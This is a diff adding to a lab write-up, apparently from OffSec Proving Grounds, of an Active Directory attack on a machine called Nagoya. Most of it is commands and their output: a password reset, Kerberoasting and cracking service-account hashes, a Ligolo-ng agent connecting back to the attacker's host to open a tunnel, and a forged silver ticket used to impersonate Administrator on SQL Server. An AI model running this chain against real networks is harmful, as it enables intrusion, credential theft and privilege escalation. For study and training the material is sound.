@@ -221,7 +221,250 @@ Last one, Christopher Lewis is member or 5 groups instead of 3 like rest of empl
 
 So now, lest do teh same and change password for chris.
 ```bash
- net rpc password christopher.lewis 'Password@' -U nagoya-industries.com/joanna.wood%'Password@' -S 192.168.237.21
+ net rpc password christopher.lewis 'Password@' -U nagoya-industries.com/joanna.wood%'Password@' -S 192.168.209.21
  ```
 
  Now evilwinrm
+ ```bash
+ evil-winrm -i 192.168.237.21  -u christopher.lewis -p "Password@"
+ ```
+
+ And... shit. Here we go again.
+ Lets check in Bloodhound what else we can do? Maybe kerberoasting and GetUserSpns?
+ Oh sure we can:
+
+ ![Bloodhound4 ss](image-6.png)
+
+ So lets try this:
+ ```bash
+ impacket-GetUserSPNs nagoya-industries.com/'fiona.clark':'Summer2023' -dc-ip 192.168.209.21 -debug -outputfile kerberoast.txt
+```
+And we have: 
+![Hash 1](image-7.png)
+
+Now, lets use hashcat or john
+
+```bash
+john  -w="/usr/share/wordlists/rockyou.txt" kerberoast    
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:05 DONE (2025-10-14 19:40) 0g/s 2538Kp/s 2538Kc/s 2538KC/s !!12Honey..*7¡Vamos!
+Session completed. 
+```
+
+So we have password for svc_helpdesk:Password@ and svc_mssql:Service1
+
+BUT! Port 1433 is not open! Maybe locally? recheck:
+
+```bash
+└─$ evil-winrm -i 192.168.209.21  -u christopher.lewis -p "Password@"  
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> netstat -ano | Select-String "1433"
+
+  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3612
+  TCP    [::]:1433              [::]:0                 LISTENING       3612
+
+```
+
+Server is listening but we cnat hear it. Lets forward 1344 port to our machine:
+
+Download Ligolo-ng proxy and agent. Upload agent to target machine. Start ligolo-proxy:
+
+```bash
+┌──(kali㉿kali)-[~/PGP/Nagoya]
+└─$ ./proxy -selfcert
+
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+INFO[0000] Listening on 0.0.0.0:11601                   
+INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
+                                                     
+WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed.                                                          
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.8
+```
+
+and then agent:
+```bash
+*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> .\agent.exe -ignore-cert -connect 192.168.45.212:11601
+
+agent.exe : time="2025-10-14T17:04:35-07:00" level=warning msg="warning, certificate validation disabled"
+    + CategoryInfo          : NotSpecified: (time="2025-10-1...ation disabled":String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+time="2025-10-14T17:04:35-07:00" level=info msg="Connection established" addr="192.168.45.212:11601"
+```
+
+Then in ligolo:
+```bash
+ligolo-ng » session
+? Specify a session : 1 - NAGOYA-IND\Christopher.Lewis@nagoya - 192.168.209.21:49894 - 0050569e81d3
+[Agent : NAGOYA-IND\Christopher.Lewis@nagoya] » ifcreate --name ligolo0
+INFO[0022] Creating a new ligolo0 interface...          
+INFO[0022] Interface created!                           
+[Agent : NAGOYA-IND\Christopher.Lewis@nagoya] » ifconfig
+┌───────────────────────────────────────────────┐
+│ Interface 0                                   │
+├──────────────┬────────────────────────────────┤
+│ Name         │ Ethernet0                      │
+│ Hardware MAC │ 00:50:56:9e:81:d3              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv4 Address │ 192.168.209.21/24              │
+└──────────────┴────────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ Interface 1                                  │
+├──────────────┬───────────────────────────────┤
+│ Name         │ Loopback Pseudo-Interface 1   │
+│ Hardware MAC │                               │
+│ MTU          │ -1                            │
+│ Flags        │ up|loopback|multicast|running │
+│ IPv6 Address │ ::1/128                       │
+│ IPv4 Address │ 127.0.0.1/8                   │
+└──────────────┴───────────────────────────────┘
+[Agent : NAGOYA-IND\Christopher.Lewis@nagoya] » tunnel_start --tun ligolo0
+INFO[0169] Starting tunnel to NAGOYA-IND\Christopher.Lewis@nagoya (0050569e81d3)
+
+[Agent : NAGOYA-IND\Christopher.Lewis@nagoya] » route_add --name ligolo0 --route 240.0.0.1/32
+INFO[0501] Route created. 
+```
+
+![ligolo](image-8.png)
+
+Time to test our tunneling!
+Use nmap:
+```bash
+nmap -p 1433 -sCV 240.0.0.1 --open  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 20:27 EDT
+Nmap scan report for 240.0.0.1
+Host is up (0.0074s latency).
+
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
+| ms-sql-info: 
+|   240.0.0.1:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2022 RTM
+|       number: 16.00.1000.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2025-10-15T00:27:58+00:00; 0s from scanner time.
+| ms-sql-ntlm-info: 
+|   240.0.0.1:1433: 
+|     Target_Name: NAGOYA-IND
+|     NetBIOS_Domain_Name: NAGOYA-IND
+|     NetBIOS_Computer_Name: NAGOYA
+|     DNS_Domain_Name: nagoya-industries.com
+|     DNS_Computer_Name: nagoya.nagoya-industries.com
+|     DNS_Tree_Name: nagoya-industries.com
+|_    Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-08-02T02:59:55
+|_Not valid after:  2054-08-02T02:59:55
+```
+
+Got it! So now lest connect to mssql:
+
+```bash
+impacket-mssqlclient svc_mssql:Service1@240.0.0.1 -windows-auth
+
+(NAGOYA-IND\svc_mssql  guest@master)> SELECT name from master.dbo.sysdatabases
+
+name     
+------   
+master   
+
+tempdb   
+
+model    
+
+msdb
+
+OR(nagoya\SQLEXPRESS): Line 105: User does not have permission to perform this action.
+ERROR(nagoya\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
+ERROR(nagoya\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
+ERROR(nagoya\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
+```
+
+We can now perform silver ticket attack that help us to trick sql server so that we can log in as who we are we say because of we do not have to connect to kdc to authenticate to sql server. So we can impersonate administrator to log in sql server.
+
+But first we need to learn domain sid and serviceprincipalname of sql server.
+
+```bash
+Import-Module ActiveDirectory
+
+Get-ADDomain
+```
+DomainSID                          : S-1-5-21-1969309164-1513403977-1686805993
+
+![Domain SID](image-9.png)
+
+and
+
+ServicePrincipalName : {MSSQL/nagoya.nagoya-industries.com}
+![alt text](image-10.png)
+
+For this action we need to covert svc_mssql password into ntlm hash with this command:
+
+```bash
+echo -n 'Service1' | iconv -t UTF-16LE | openssl md4
+```
+
+Now the ticket to impersonate admin:
+```bash
+impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+```
+
+export cache:
+```
+export KRB5CCNAME=~/PGP/Nagoya/Administrator.ccache
+```
+
+No we can login witghout password. Modify kerb5.conf
+
+```bash
+sudo apt install krb5-user
+
+mousepad /etc/krb5.conf
+
+[libdefaults]
+        default_realm = NAGOYA-INDUSTRIES.COM
+
+# The following krb5.conf variables are only for MIT Kerberos.
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+        rdns = false
+
+
+# The following libdefaults parameters are only for Heimdal Kerberos.
+        fcc-mit-ticketflags = true
+
+[realms]
+        NAGOYA-INDUSTRIES.COM = {
+        kdc=nagoya.nagoya-industries.com
+        }
+
+[domain_realm]
+        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
+```
+
+nano /etc/hosts
+![alt text](image-11.png)
+
+now try:
+impacket-mssqlclient -k nagoya.nagoya-industries.com  
+
+![](image-12.png)
